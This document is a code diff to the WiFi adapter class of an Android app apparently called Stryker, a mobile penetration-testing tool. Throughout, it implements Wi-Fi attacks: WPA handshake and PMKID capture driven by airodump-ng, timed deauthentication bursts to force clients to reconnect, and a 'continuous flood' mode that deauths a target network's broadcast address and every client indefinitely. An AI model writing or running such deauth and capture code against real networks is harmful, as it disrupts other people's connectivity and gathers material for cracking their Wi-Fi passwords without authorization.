@@ -15,7 +15,6 @@ import android.content.Intent;
 import android.graphics.Color;
 import android.graphics.drawable.ColorDrawable;
 import android.os.Build;
-import android.text.Html;
 import android.text.Layout;
 import android.text.method.ScrollingMovementMethod;
 import android.view.LayoutInflater;
@@ -54,8 +53,10 @@ import java.io.OutputStream;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Date;
+import java.util.HashSet;
 import java.util.Locale;
 import java.util.Objects;
+import java.util.Set;
 import java.util.Timer;
 import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.regex.Matcher;
@@ -584,13 +585,7 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
             Timer deauthtimer = new Timer();
             final boolean[] hsStatus = {false};
             final boolean[] pmkidStatus = {false};
-            ArrayList<String> clients = new ArrayList<>();
-            ArrayList<String> dclients = new ArrayList<>();
-            String data = "<b><p style='color:#2E7D32'>Airodump-ng running normally - {s}</p></b>\n\n"+
-                    "<p>{deauth}</p>\n\n"+
-                    "\n\n<b><p>Clients (total - {total}): {clients}</p></b>\n\n";
-            final String[] deauthNow = {"Aireplay-ng deauth not running"};
-            final String[] second = {"1s"};
+            final String[] second = {"0s"};
             handshake = new AdvancedThread(activity,context) {
                 @Override
                 public void onFinished() {
@@ -624,8 +619,6 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                     String scanRaw = core.getString("wlan_scan");
                     String deauthRaw = core.getString("wlan_deauth");
                     if (deauthRaw == null) deauthRaw = "";
-                    // Internal wlan0 often lacks injection, but some phones/kernels
-                    // keep monitor on wlan0 (no wlan0mon) and can inject — try anyway.
                     boolean likelyInternal = deauthRaw.matches("s?wlan0");
                     int channel = network.getChannel();
                     if (channel <= 0) {
@@ -634,92 +627,100 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                         return;
                     }
                     String channelStr = String.valueOf(channel);
-                    sendEvent("Enabling monitor mode on ch " + channelStr + "...");
+                    String bssid = network.getMac();
+                    sendEvent("=== Handshake capture ===");
+                    sendEvent("Target: " + network.getSsid() + " (" + bssid + ")");
+                    sendEvent("Channel: " + channelStr
+                            + (Boolean.TRUE.equals(network.getIs5hhz()) ? " · 5 GHz" : " · 2.4 GHz"));
+                    sendEvent("Scan iface pref: " + scanRaw + " · Deauth iface pref: " + deauthRaw);
+                    sendEvent("Enabling monitor mode…");
                     if (likelyInternal) {
                         sendEvent("Note: deauth iface is " + deauthRaw
                                 + " (no mon rename). Injection may fail on some phones.");
                     }
+
+                    core.customCommand("mkdir -p /sdcard/Stryker/hs /sdcard/Stryker/captured", true);
+                    core.deleteFile(core.getStorage()+"Stryker/hs/handshake-01.cap");
+
                     monitor = core.monitorManager.enableMonitorMode(scanRaw, channelStr);
+                    sendEvent("Monitor (scan): " + (monitor ? "OK" : "FAILED") + " on " + scanRaw);
                     if (!scanRaw.equals(deauthRaw)) {
                         monitor2 = core.monitorManager.enableMonitorMode(deauthRaw, channelStr);
+                        sendEvent("Monitor (deauth): " + (monitor2 ? "OK" : "FAILED") + " on " + deauthRaw);
                     }
 
-                    // Prefer live mon iface names after airmon-ng rename; stays wlan0 if no rename
                     String hsIface = core.getHSInterface();
                     String deauthIface = core.getDeauthInterface();
+                    sendEvent("Resolved ifaces → listen=" + hsIface + " deauth=" + deauthIface);
                     core.lockWifiChannel(hsIface, channelStr);
                     if (!hsIface.equals(deauthIface)) {
                         core.lockWifiChannel(deauthIface, channelStr);
                     }
+                    sendEvent("Locked channel " + channelStr + " on listen/deauth ifaces");
 
                     final boolean[] airoRunning = {false};
+                    WifiDeauthEngine.LineSink sink = this::sendEvent;
 
                     if (monitor && monitor2){
-                        sendEvent("Starting airodump-ng...");
-                        core.deleteFile(core.getStorage()+"Stryker/hs/handshake-01.cap");
+                        sendEvent("Starting airodump-ng…");
                         new Thread(() -> {
-                            // Always pin -c <channel>. 5 GHz still needs a fixed channel;
-                            // --band a alone hops and leaves aireplay on channel -1.
                             String cmd = "airodump-ng " + hsIface
                                     + " -w /sdcard/Stryker/hs/handshake --ignore-negative-one"
                                     + " --output-format pcap -c " + channelStr
-                                    + " --bssid " + network.getMac() + " --update 3";
+                                    + " --bssid " + bssid + " --update 2";
                             if (Boolean.TRUE.equals(network.getIs5hhz())) {
                                 cmd += " --band a";
                             }
+                            cmd += " 2>&1";
+                            sendEvent("[airodump] " + cmd);
 
-                            core.getLogger().writeLine("Starting airodump-ng... " + cmd,1);
-
-                            airodump =     new AdvancedProcess(activity, context, cmd, true) {
+                            airodump = new AdvancedProcess(activity, context, cmd, true) {
                                 @Override
                                 public void onFinished(ArrayList<String> outputList) {
-
+                                    sendEvent("[airodump] exited");
                                 }
 
                                 @Override
                                 public void onNewLine(String line) {
-                                    if (line != null){
-                                        if (line.contains(network.getMac().toUpperCase()) || line.contains(network.getMac()) || line.contains(network.getMac().toLowerCase()) || line.contains(" WPA")){
-                                            airoRunning[0] = true;
-                                        }
-                                        if (line.contains("[") && line.contains("]")){
-                                            String[] split = line.split("]");
-                                            if (split.length > 1){
-                                                second[0] = split[1].replace("Elapsed:","").replaceAll("\\s+","").replace("[","").replace("]","");
-                                            }
-                                        }
-
-                                        line = line.replace(network.getMac().toUpperCase(),"");
-                                        line = line.trim().replaceAll("\\s+"," ");
-                                        String mac = line.split(" ")[1];
-                                        if (mac.contains(":") && !clients.contains(mac)){
-                                            clients.add(mac);
-                                            sendEvent("New client found : "+mac);
-                                        }
-                                        if (line.contains("WPA handshake:")){
-                                            sendEvent("Handshake captured! Bingo!");
-                                            hsStatus[0] = true;
-                                        }
-                                        if (line.contains("PMKID")){
-                                            sendEvent("PMKID captured! Bingo!");
-                                            pmkidStatus[0] = true;
-                                        }
-                                    }}
+                                    if (line == null || line.trim().isEmpty()) return;
+                                    String raw = line.trim();
+                                    if (raw.contains(bssid.toUpperCase())
+                                            || raw.contains(bssid)
+                                            || raw.contains(bssid.toLowerCase())
+                                            || raw.contains(" WPA")
+                                            || raw.contains(" PSK")) {
+                                        airoRunning[0] = true;
+                                    }
+                                    if (raw.contains("Elapsed:")) {
+                                        Matcher em = Pattern.compile("Elapsed:\\s*([^\\]]+)").matcher(raw);
+                                        if (em.find()) second[0] = em.group(1).trim();
+                                    }
+                                    WifiDeauthEngine.collectClientsFromAirodump(
+                                            raw, bssid, clients, null);
+                                    if (WifiDeauthEngine.lineHasHandshake(raw)) {
+                                        sendEvent("[airodump] " + raw);
+                                        sendEvent("Handshake seen by airodump!");
+                                        hsStatus[0] = true;
+                                    } else if (WifiDeauthEngine.lineHasPmkid(raw)) {
+                                        sendEvent("[airodump] " + raw);
+                                        sendEvent("PMKID seen by airodump!");
+                                        pmkidStatus[0] = true;
+                                    }
+                                }
 
                                 @Override
-                                public void onEvent(String line) {
-
-                                }
+                                public void onEvent(String line) { }
                             };
+                            // Keep airodump lines out of global logger spam; we cherry-pick above
                             airodump.setNoLog(true);
-                        }).start();
-                        sendEvent("Waiting for target on channel " + channelStr + "...");
+                        }, "hs-airodump").start();
+
+                        sendEvent("Waiting for target beacon on ch " + channelStr + " (up to 60s)…");
                         long waitUntil = System.currentTimeMillis() + 60_000L;
                         while (!airoRunning[0] && System.currentTimeMillis() < waitUntil && !isCanceled()){
                             try {
                                 Thread.sleep(1000);
                             } catch (InterruptedException e) {
-                                e.printStackTrace();
                                 break;
                             }
                         }
@@ -728,79 +729,77 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                             setCanceled(true);
                             return;
                         }
-                            sendEvent("Airodump-ng launched!");
-                            sendEvent("Deauth cadence: burst every "
-                                    + WifiDeauthEngine.BURST_INTERVAL_SEC
-                                    + "s (broadcast + clients), then wait for handshake…");
-                            core.lockWifiChannel(deauthIface, channelStr);
+                        sendEvent("Target visible. Wifite-style deauth: burst every "
+                                + WifiDeauthEngine.BURST_INTERVAL_SEC
+                                + "s (broadcast + clients), then wait for HS…");
+                        core.lockWifiChannel(deauthIface, channelStr);
 
-                            // Wifite-style: short bursts so clients can reconnect and complete HS.
-                            // Continuously flooding prevents association → no handshake.
-                            while (!hsStatus[0] && !pmkidStatus[0] && !isCanceled()) {
+                        int round = 0;
+                        while (!hsStatus[0] && !pmkidStatus[0] && !isCanceled()) {
+                            round++;
+                            // Channel is pinned by airodump -c; only re-lock if needed.
+                            // Repeated iw set channel spam "Set Frequency" on many phones.
+                            sendEvent("--- deauth round #" + round
+                                    + " · clients=" + clients.size()
+                                    + " · elapsed=" + second[0] + " ---");
+                            ArrayList<String> snapshot = WifiDeauthEngine.copyClients(clients);
+                            String burstLog = WifiDeauthEngine.fireBurst(
+                                    core, deauthIface, bssid, snapshot, sink);
+                            sendEvent("Burst done: " + burstLog
+                                    + " · listening " + WifiDeauthEngine.BURST_INTERVAL_SEC + "s…");
+
+                            // Retune only when aireplay complained about channel
+                            if (burstLog != null && burstLog.contains("(warn)")) {
                                 core.lockWifiChannel(hsIface, channelStr);
                                 core.lockWifiChannel(deauthIface, channelStr);
-                                ArrayList<String> snapshot = WifiDeauthEngine.copyClients(clients);
-                                String burstLog = WifiDeauthEngine.fireBurst(
-                                        core, deauthIface, network.getMac(), snapshot);
-                                deauthNow[0] = "Burst: " + burstLog
-                                        + " · next in " + WifiDeauthEngine.BURST_INTERVAL_SEC + "s";
-                                sendEvent(deauthNow[0]);
+                            }
 
-                                long burstWaitUntil = System.currentTimeMillis()
-                                        + WifiDeauthEngine.BURST_INTERVAL_SEC * 1000L;
-                                while (!hsStatus[0] && !pmkidStatus[0] && !isCanceled()
-                                        && System.currentTimeMillis() < burstWaitUntil) {
-                                    StringBuilder cls = new StringBuilder();
-                                    for (String client : clients) {
-                                        cls.append(client).append(" ");
-                                    }
-                                    activity.runOnUiThread(() -> {
-                                        String dataset = data.replace("{s}", second[0])
-                                                .replace("{clients}", cls.toString())
-                                                .replace("{total}", String.valueOf(clients.size()))
-                                                .replace("{deauth}", deauthNow[0]);
-                                        if (core.getBoolean("hide")) {
-                                            dataset = dataset
-                                                    .replace(network.getMac(), Core.HIDDEN_MAC)
-                                                    .replace(network.getMac().toUpperCase(), Core.HIDDEN_MAC)
-                                                    .replace(network.getMac().toLowerCase(), Core.HIDDEN_MAC);
-                                        }
-                                        outputtext.setText(Html.fromHtml(dataset));
-                                    });
-                                    try {
-                                        Thread.sleep(250);
-                                    } catch (InterruptedException e) {
-                                        break;
-                                    }
+                            // Also verify .cap via aircrack (airodump UI line is easy to miss)
+                            if (WifiDeauthEngine.capHasHandshake(core,
+                                    "/sdcard/Stryker/hs/handshake-01.cap")) {
+                                sendEvent("aircrack-ng confirms handshake in cap file");
+                                hsStatus[0] = true;
+                                break;
+                            }
+
+                            long burstWaitUntil = System.currentTimeMillis()
+                                    + WifiDeauthEngine.BURST_INTERVAL_SEC * 1000L;
+                            while (!hsStatus[0] && !pmkidStatus[0] && !isCanceled()
+                                    && System.currentTimeMillis() < burstWaitUntil) {
+                                try {
+                                    Thread.sleep(500);
+                                } catch (InterruptedException e) {
+                                    break;
                                 }
                             }
-                            if (airodump != null) {
+                        }
+                        if (airodump != null) {
                             airodump.kill();
-                            }
-                            if (isCanceled()) {
-                                return;
-                            }
-                            if (hsStatus[0]) {
-                                sendEvent("Handshake captured!");
-                                StringBuilder filename = new StringBuilder();
-                                String time = new SimpleDateFormat("MM_HH_mm").format(new Date());
-                                filename.append("HS_").append(network.getSsid().replace(" ", "_")).append(time).append(".cap");
-                                core.moveFile(core.getStorage() + "Stryker/hs/handshake-01.cap", core.getStorage() + "Stryker/captured/" + filename);
-                                sendEvent("Handshake saved to /sdcard/Stryker/captured/" + filename);
-                                com.zalexdev.stryker.geomac.GeoHooks.recordHandshake(
-                                        context, network.getMac(), network.ssid);
-                                activity.runOnUiThread(this::onFinished);
-                            }else{
-                                sendEvent("PMKID captured!");
-                                StringBuilder filename = new StringBuilder();
-                                String time = new SimpleDateFormat("MM_HH_mm").format(new Date());
-                                filename.append("PMKID_").append(network.getSsid().replace(" ", "_")).append(time).append(".cap");
-                                core.moveFile(core.getStorage() + "Stryker/hs/handshake-01.cap", core.getStorage() + "Stryker/captured/" + filename);
-                                sendEvent("PMKID saved to /sdcard/Stryker/captured/" + filename);
-                                com.zalexdev.stryker.geomac.GeoHooks.recordHandshake(
-                                        context, network.getMac(), network.ssid);
-                                activity.runOnUiThread(this::onFinished);
-                            }
+                        }
+                        if (isCanceled()) {
+                            return;
+                        }
+                        if (hsStatus[0]) {
+                            sendEvent("Handshake captured!");
+                            String time = new SimpleDateFormat("MM_HH_mm").format(new Date());
+                            String filename = "HS_" + network.getSsid().replace(" ", "_") + time + ".cap";
+                            core.moveFile(core.getStorage() + "Stryker/hs/handshake-01.cap",
+                                    core.getStorage() + "Stryker/captured/" + filename);
+                            sendEvent("Saved → /sdcard/Stryker/captured/" + filename);
+                            com.zalexdev.stryker.geomac.GeoHooks.recordHandshake(
+                                    context, network.getMac(), network.ssid);
+                            activity.runOnUiThread(this::onFinished);
+                        } else if (pmkidStatus[0]) {
+                            sendEvent("PMKID captured!");
+                            String time = new SimpleDateFormat("MM_HH_mm").format(new Date());
+                            String filename = "PMKID_" + network.getSsid().replace(" ", "_") + time + ".cap";
+                            core.moveFile(core.getStorage() + "Stryker/hs/handshake-01.cap",
+                                    core.getStorage() + "Stryker/captured/" + filename);
+                            sendEvent("Saved → /sdcard/Stryker/captured/" + filename);
+                            com.zalexdev.stryker.geomac.GeoHooks.recordHandshake(
+                                    context, network.getMac(), network.ssid);
+                            activity.runOnUiThread(this::onFinished);
+                        }
 
                     }else {
                         sendEvent("Failed to start monitor mode");
@@ -810,7 +809,7 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
 
                 @Override
                 public void onCanceled() {
-                    sendEvent("Attack was canceled due to critical error, please check log for more information!");
+                    sendEvent("Attack canceled.");
                     activity.runOnUiThread(() -> {
                         core.scale(wifiimg,1.0F);
                         core.scale(attack_progress,0.0F);
@@ -822,10 +821,7 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                         if(deauther != null){
                             deauther.kill();
                         }
-
-
                     });
-
                 }
             };
             
@@ -1136,10 +1132,14 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
             String deauthRaw = core.getString("wlan_deauth");
             if (deauthRaw == null) deauthRaw = "";
             int channel = network.getChannel();
+            String bssid = network.getMac();
             if (channel <= 0) {
                 outputtext.append("Invalid channel (" + channel + "). Rescan WiFi and try again.\n");
             } else {
                 String channelStr = String.valueOf(channel);
+                outputtext.append("=== Continuous deauth ===\n");
+                outputtext.append("Target: " + network.getSsid() + " (" + bssid + ")\n");
+                outputtext.append("Channel: " + channelStr + "\n");
                 if (deauthRaw.matches("s?wlan0")) {
                     outputtext.append("Using " + deauthRaw + " (monitor stays on wlan0, no *mon rename). "
                             + "Injection depends on your kernel/driver.\n");
@@ -1149,56 +1149,110 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                 String deauthIface = core.getDeauthInterface();
                 if (ok) {
                     core.lockWifiChannel(deauthIface, channelStr);
-                    outputtext.append("Locked " + deauthIface + " to channel " + channelStr + "\n");
-                    outputtext.append("Deauth: broadcast + directed clients, burst every "
-                            + WifiDeauthEngine.BURST_INTERVAL_SEC + "s\n");
+                    outputtext.append("Monitor OK · iface=" + deauthIface
+                            + " · locked ch " + channelStr + "\n");
+                    outputtext.append("Mode: continuous flood (broadcast forever + directed clients)\n");
                     ArrayList<String> liveClients = new ArrayList<>();
-                    // Light airodump so we learn client MACs to target with -c
-                    airodump = new AdvancedProcess(activity, context,
-                            "airodump-ng " + deauthIface
-                                    + " --ignore-negative-one --bssid " + network.getMac()
-                                    + " -c " + channelStr + " --update 2", true) {
-                        @Override public void onFinished(ArrayList<String> outputList) { }
+                    Set<String> directedStarted = new HashSet<>();
+
+                    WifiDeauthEngine.LineSink uiSink = line -> activity.runOnUiThread(() -> {
+                        String out = line;
+                        if (core.getBoolean("hide")) {
+                            Matcher m = Pattern.compile("((\\w{2}:){5}\\w{2})").matcher(out);
+                            if (m.find()) {
+                                out = out.replace(m.group(), Core.HIDDEN_MAC);
+                            }
+                        }
+                        outputtext.append(out + "\n");
+                        smoothScrool(outputtext);
+                    });
+
+                    // Discover clients (and retune awareness)
+                    String airoCmd = "airodump-ng " + deauthIface
+                            + " --ignore-negative-one --bssid " + bssid
+                            + " -c " + channelStr + " --update 2 2>&1";
+                    uiSink.onLine("[airodump] " + airoCmd);
+                    airodump = new AdvancedProcess(activity, context, airoCmd, true) {
+                        @Override public void onFinished(ArrayList<String> outputList) {
+                            uiSink.onLine("[airodump] exited");
+                        }
                         @Override public void onEvent(String line) { }
                         @Override
                         public void onNewLine(String line) {
-                            if (line == null) return;
-                            line = line.trim().replaceAll("\\s+", " ");
-                            String[] parts = line.split(" ");
-                            if (parts.length > 1) {
-                                String mac = parts[1];
-                                if (mac.contains(":")
-                                        && !mac.equalsIgnoreCase(network.getMac())
-                                        && !liveClients.contains(mac)) {
-                                    liveClients.add(mac);
-                                    activity.runOnUiThread(() -> {
-                                        outputtext.append("Client: " + mac + "\n");
-                                        smoothScrool(outputtext);
-                                    });
-                                }
-                            }
+                            if (line == null || line.trim().isEmpty()) return;
+                            WifiDeauthEngine.collectClientsFromAirodump(
+                                    line, bssid, liveClients, uiSink);
                         }
                     };
                     airodump.setNoLog(true);
 
-                    // Cancel sets finished[0] and kills airodump; this loop exits then.
+                    // Continuous broadcast deauth — all aireplay lines go to the window
+                    String bcCmd = WifiDeauthEngine.continuousBroadcastCmd(deauthIface, bssid);
+                    uiSink.onLine("[aireplay] " + bcCmd);
+                    deauther = new AdvancedProcess(activity, context, bcCmd, true) {
+                        @Override
+                        public void onFinished(ArrayList<String> outputList) {
+                            uiSink.onLine("[aireplay] broadcast process exited");
+                        }
+
+                        @Override
+                        public void onNewLine(String line) {
+                            if (line == null || line.trim().isEmpty()) return;
+                            String out = line.trim();
+                            if (core.getBoolean("hide")) {
+                                Matcher m = Pattern.compile("((\\w{2}:){5}\\w{2})").matcher(out);
+                                if (m.find()) {
+                                    out = out.replace(m.group(), Core.HIDDEN_MAC);
+                                }
+                            }
+                            outputtext.append(out + "\n");
+                            smoothScrool(outputtext);
+                            String low = out.toLowerCase(Locale.US);
+                            if (low.contains("no such device") || low.contains("injection is currently impossible")) {
+                                outputtext.append("Deauth may have failed — card may lack injection.\n");
+                            } else if (out.contains("channel -1") || out.contains("Waiting for beacon")) {
+                                core.lockWifiChannel(deauthIface, channelStr);
+                                uiSink.onLine("[aireplay] retuned channel " + channelStr);
+                            }
+                        }
+
+                        @Override
+                        public void onEvent(String line) { }
+                    };
+
+                    // While broadcast floods, keep hitting known clients with directed frames
+                    // (separate short aireplay runs — avoids AdvancedProcess static-process clash).
                     new Thread(() -> {
+                        int idleTicks = 0;
                         while (!finished[0]) {
-                            core.lockWifiChannel(deauthIface, channelStr);
-                            String burst = WifiDeauthEngine.fireBurst(
-                                    core, deauthIface, network.getMac(), liveClients);
-                            activity.runOnUiThread(() -> {
-                                outputtext.append(burst + "\n");
-                                smoothScrool(outputtext);
-                            });
+                            ArrayList<String> snap = WifiDeauthEngine.copyClients(liveClients);
+                            if (snap.isEmpty()) {
+                                if (idleTicks % 3 == 0) {
+                                    uiSink.onLine("[deauth] waiting for clients… (broadcast still running)");
+                                }
+                                idleTicks++;
+                            } else {
+                                idleTicks = 0;
+                                for (String client : snap) {
+                                    if (finished[0]) break;
+                                    String key = client.toLowerCase(Locale.US);
+                                    if (!directedStarted.contains(key)) {
+                                        directedStarted.add(key);
+                                        uiSink.onLine("[deauth] new client → targeting " + client);
+                                    }
+                                    WifiDeauthEngine.fireDirectedBurst(
+                                            core, deauthIface, bssid, client, uiSink);
+                                }
+                            }
                             try {
-                                Thread.sleep(WifiDeauthEngine.BURST_INTERVAL_SEC * 1000L);
+                                Thread.sleep(4000);
                             } catch (InterruptedException e) {
                                 break;
                             }
                         }
                         if (airodump != null) airodump.kill();
-                    }, "stryker-deauth-burst").start();
+                        if (deauther != null) deauther.kill();
+                    }, "stryker-deauth-clients").start();
                 } else {
                     outputtext.append(context.getString(R.string.wifi_monitor_failed, deauthRaw) + "\n");
                 }
